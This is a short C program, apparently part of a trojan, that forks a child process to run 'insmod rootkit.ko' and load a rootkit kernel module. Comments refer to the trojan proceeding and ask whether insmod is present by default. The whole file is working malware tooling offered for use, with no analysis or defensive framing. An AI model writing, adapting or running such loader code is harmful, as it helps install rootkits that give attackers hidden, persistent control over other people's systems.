#include <stdlib.h>
#include <sys/types.h>
#include <sys/wait.h> //
#include <unistd.h>

int main() {
    char* payload[] = {"insmod", "rootkit.ko", NULL}; // is insmod installed by default?
    pid_t pid = fork();
    if (pid == 0) {
        if (execvp(payload[0], payload) < 0) {
            //
            exit(0);
        }
    } else {
        wait(0); // TODO: so that the trojan can proceed without freezing
    }
    return 0;
}